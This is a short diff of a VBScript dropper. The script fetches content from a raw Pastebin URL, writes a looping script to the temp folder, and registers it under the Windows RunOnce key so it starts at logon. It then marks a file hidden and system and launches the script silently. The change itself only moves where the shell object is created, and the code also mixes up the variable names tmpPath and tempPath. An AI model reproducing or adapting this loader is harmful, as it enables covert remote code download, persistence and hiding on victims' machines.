@@ -2,7 +2,6 @@ On Error Resume Next
 Set objFSO = CreateObject("Scripting.FileSystemObject")
 tmpPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%temp%") & "\.vbs"
 objFSO.DeleteFile tmpPath
-Set objShell = CreateObject("WScript.Shell")
 Set oHTTP = CreateObject("MSXML2.XMLHTTP")
 oHTTP.open "GET", "https://pastebin.com/raw/knWXwasC", False
 oHTTP.send
@@ -39,6 +38,7 @@ objFile.WriteLine "Loop"
 objFile.WriteLine "On Error Goto 0"
 objFile.Close
 
+Set objShell = CreateObject("WScript.Shell")
 objShell.Run "reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce"" /v ""Start"" /t REG_SZ /d ""%TEMP%\Start.vbs"" /f", 0, True
 objFSO.GetFile(tempPath).Attributes = objFSO.GetFile(tempPath).Attributes Or 3
 objShell.Run "%TEMP%\Start.vbs", 0, False
